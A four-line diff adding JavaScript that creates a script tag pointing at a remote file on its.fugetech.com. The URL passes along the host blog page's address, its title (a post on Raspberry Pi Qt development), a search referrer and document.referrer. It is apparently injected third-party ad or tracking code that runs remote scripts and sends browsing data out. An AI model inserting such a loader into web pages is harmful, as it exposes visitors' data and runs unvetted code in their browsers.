@@ -1,0 +1,4 @@
+
+  var s0 = document.createElement("script");
+  s0.src = "http://its.fugetech.com/m.js?p=3752&k=B699A0CCE5009DE9&g=0c7c4cb3a16948db961a66293638c93e&lp=http%3A%2F%2Fwww.eefocus.com%2Fnightseas%2Fblog%2F15-03%2F310769_b2d11.html&ti=%E3%80%90%E7%8E%A9%E6%A0%91%E8%8E%93%E3%80%91%E7%BC%96%E7%A8%8B%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91Qt+GUI%E7%A8%8B%E5%BA%8F+-+%E7%94%B5%E5%AD%90%E6%87%92%E5%85%94+-+%E4%B8%8E%E9%9D%9E%E5%8D%9A%E5%AE%A2+-+%E4%B8%8E%E9%9D%9E%E7%BD%91&rf=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DPoN0YDUDUg8gobdcTOx7xqld3mdG9h5RdQyoEzR76IcTLH4NGmPJFH2ZUv-RQSWsrNj8hlQmq_nRwkJKTAlWcBXy0qkTrfRjmFYVWNrRxD_%26wd%3D%26eqid%3Da5a8e33a0000d2a0000000055763b3b4&referrer=" + encodeURIComponent(document.referrer);
+  document.getElementsByTagName('head')[0].appendChild(s0)
